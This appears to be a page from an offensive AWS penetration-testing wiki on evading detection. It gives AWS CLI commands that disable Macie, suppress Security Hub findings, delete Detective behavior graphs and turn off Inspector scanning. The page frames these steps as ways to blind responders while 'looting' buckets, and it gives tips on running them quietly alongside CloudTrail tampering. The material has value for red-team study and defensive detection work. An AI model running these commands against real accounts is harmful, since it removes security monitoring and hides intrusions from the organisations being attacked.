---
title: "Security services: disabling Macie, Security Hub, Detective, and Inspector"
order: 5
description: "Disabling and degrading the AWS posture services, Macie, Security Hub, Detective, and Inspector, to blind data-exposure, aggregated-finding, and vulnerability detection before and after noisy actions."
keywords:
  - Macie
  - Security Hub
  - Detective
  - Inspector
  - detection evasion
  - posture
  - disable
---

# Security services

Beyond CloudTrail and GuardDuty, AWS ships a layer of posture and finding-aggregation services that surface what an operator is doing: **Macie** classifies and flags sensitive S3 data, **Security Hub** aggregates findings from every other service into one console, **Detective** graphs behavior for investigation, and **Inspector** reports exploitable software and network exposure. Each is disabled or narrowed with a single management call, and because they feed the same console a responder watches, degrading them widens the blind spot the other evasion pages open.

## Macie

```bash
aws macie2 get-macie-session                     # is Macie on, and the account id
aws macie2 disable-macie                         # stop sensitive-data discovery entirely
# quieter: cancel the classification job about to scan the bucket you are looting
aws macie2 update-classification-job --job-id <id> --job-status CANCELLED
```

## Security Hub

```bash
aws securityhub describe-hub
aws securityhub disable-security-hub             # tear down the aggregation console
# quieter: batch-suppress the findings you expect to raise
aws securityhub batch-update-findings \
  --finding-identifiers '[{"Id":"<id>","ProductArn":"<arn>"}]' \
  --workflow Status=SUPPRESSED
# or drop the standards that run the controls catching you
aws securityhub batch-disable-standards --standards-subscription-arns <arn>
```

## Detective

```bash
aws detective list-graphs
aws detective delete-graph --graph-arn <arn>     # remove the behavior graph
# in a member setup, cut this account out of the investigation graph
aws detective disassociate-membership --graph-arn <arn>
```

## Inspector

```bash
aws inspector2 batch-get-account-status
aws inspector2 disable --resource-types EC2 ECR LAMBDA   # stop vulnerability reporting
```

## Exploitation notes

- Every call here is a management event CloudTrail records, so sequence them with the [CloudTrail](cloudtrail.md) work or accept that they surface.
- Prefer the selective calls (cancel the Macie job, suppress the Security Hub finding, disable one Inspector scan type) over a full disable when the service is watched for being enabled.
- These are often run from a delegated-admin or management account; in an organization setup, disabling centrally blinds every member at once, while a member-account call only blinds that member.
- Security Hub is an aggregator: suppressing a finding there hides it from the console even while the source service (GuardDuty, Config, Inspector) still holds it, which is quieter than touching each source.

## Tools

- **AWS CLI** (`macie2`, `securityhub`, `detective`, `inspector2`): all of the above.
- **Pacu** (`detection__enum_services`): enumerate which posture services are enabled before touching them.

## References

- [HackTricks Cloud: AWS defense evasion](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [AWS: Security Hub BatchUpdateFindings](https://docs.aws.amazon.com/securityhub/1.0/APIReference/API_BatchUpdateFindings.html)
- [AWS: Macie disable-macie](https://docs.aws.amazon.com/macie/latest/APIReference/macie.html)
- [Stratus Red Team: AWS defense-evasion techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Datadog Security Labs: AWS defense-evasion research](https://securitylabs.datadoghq.com/)
